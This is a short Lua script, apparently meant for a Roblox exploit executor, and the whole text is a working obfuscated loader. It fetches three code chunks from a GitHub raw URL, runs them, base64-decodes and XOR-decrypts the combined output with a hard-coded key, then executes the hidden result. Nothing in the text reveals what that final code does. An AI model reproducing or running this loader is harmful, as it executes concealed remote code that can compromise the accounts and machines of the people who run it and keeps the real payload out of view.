local u={"https://raw.githubusercontent.com/alexzerikov-sudo/magicalay-dist/main/d1.lua","https://raw.githubusercontent.com/alexzerikov-sudo/magicalay-dist/main/d2.lua","https://raw.githubusercontent.com/alexzerikov-sudo/magicalay-dist/main/d3.lua"}
local s=""
for i=1,#u do s=s..loadstring(game:HttpGet(u[i]))() end
local e=0
if s:sub(-1,-1)=="=" then e=e+1 end
if s:sub(-2,-2)=="=" then e=e+1 end
local b='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
local t={}
for i=1,#s,4 do
local n=0
for j=0,3 do local c=s:sub(i+j,i+j)n=n*64+((c=="=")and 0 or(b:find(c,1,true)-1))end
t[#t+1]=string.char(math.floor(n/65536))t[#t+1]=string.char(math.floor(n/256)%256)t[#t+1]=string.char(n%256)end
local d=table.concat(t)
if e>0 then d=d:sub(1,#d-e) end
local k={95,166,86,17,145,43,130,205,31,107,118,186,61,58,101,148}
local o={}
for i=1,#d do o[i]=string.char(bit32.bxor(d:byte(i),k[(i-1)%16+1])) end
loadstring(table.concat(o))()
